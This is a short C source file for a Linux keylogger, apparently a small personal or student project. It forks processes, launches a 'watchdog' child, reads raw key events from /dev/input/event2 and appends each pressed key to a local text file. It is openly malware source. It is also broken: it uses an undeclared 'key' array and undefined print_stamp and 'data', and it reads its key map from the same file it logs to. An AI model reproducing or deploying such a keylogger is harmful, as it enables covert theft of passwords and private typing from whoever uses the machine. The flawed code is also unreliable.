#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>


char keys[242][20];


main() {
	printf("Starting keylogger\n");

	int piped[2];

	pipe(piped);

	pid_t pid = fork();

	if(pid == -1) {
		perror("Child couldn't be created\n");
		exit(1);
	}

	if(pid == 0) {
		close(piped[1]);
		char *watchdogName = "./build/watchdog.exe";

		char readPipe[10];
		sprintf(readPipe, "%d", piped[0]);

		char *args[3];
		args[0] = watchdogName;
		args[1] = readPipe;
		args[2] = NULL;

		execv(watchdogName, args);
	}
	else {
		if(fork() == 0) {
			close(piped[0]);

			load_key_map();

			int file;
			FILE *result;

			printf("Iniciando keylogger (%d)\n", getpid());

			file = open("/dev/input/event2", O_RDONLY);
			result = fopen("./etc/keys.txt", "a+");

			struct input_event ev;

			while(1) {
				read(file, &ev, sizeof(struct input_event));
				if(ev.type == EV_KEY) {
					if(ev.value == 1) {
						//printf(" : [key %i]\n", ev.code);
						fputc(key[ev.code], result);
						fflush(result);
					}
				}
			}
		}
	}
}

void load_key_map() {
	FILE *kf = fopen("./etc/keys.txt", "r");
	if(kf == NULL){ 
		print_stamp();
		fprintf(data, "ERROR : keys file missing\n");
		exit(0);
	}
	char line[40];
	int i;
	for(i = 0; fgets(line, 30, kf) > 0 && i < 242; i++){
		line[strlen(line) - 1] = '\0';
		strcpy(keys[i], line);
	}
	fclose(kf);
}